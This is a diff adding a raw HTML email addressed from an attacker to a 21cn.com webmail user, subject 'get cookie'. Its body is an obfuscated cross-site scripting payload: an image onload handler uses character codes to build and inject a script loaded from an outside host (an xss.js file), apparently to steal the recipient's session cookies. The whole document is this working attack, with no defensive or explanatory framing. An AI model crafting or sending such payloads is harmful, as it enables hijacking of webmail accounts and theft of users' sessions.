@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: get cookie
+To: victim@21cn.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img src='http://www.baidu.com/img/baidu_logo.gif' onload='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,115,116,117,110,111,116,101,46,115,105,110,97,97,112,112,46,99,111,109,47,120,115,115,46,106,115);document.body.appendChild(s);'/>
